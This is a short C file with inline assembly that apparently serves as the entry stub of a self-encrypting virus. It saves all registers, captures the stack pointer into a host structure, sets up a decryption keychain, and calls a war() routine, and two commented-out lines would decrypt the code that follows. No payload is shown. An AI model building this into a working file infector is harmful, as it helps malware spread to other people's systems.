#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void __entry(void)
{
	asm volatile
	(
		"push rbx\n"
		"push rsp\n"
		"push rbp\n"
		"push rax\n"
		"push rdi\n"
		"push rsi\n"
		"push rdx\n"
		"push rcx\n"
		"push r8\n"
		"push r9\n"
		"push r10\n"
		"push r11\n"
		"push r12\n"
		"push r13\n"
		"push r14\n"
		"push r15\n"
	);

	struct s_keychain keychain = {0};
	struct s_host host = {0};

	asm volatile
	(
		"mov %0, rsp\n"
		: "=r"(host.stack)
		:
	);

//	update_keychain_left(&keychain, (char *)__entry, (void *)host_constructor - (void *)__entry);
//	decrypt_left(&keychain, (char *)&host_constructor, (void *)&criteria - (void *)&host_constructor);

	war(&host, &keychain, SUCCESS);
}
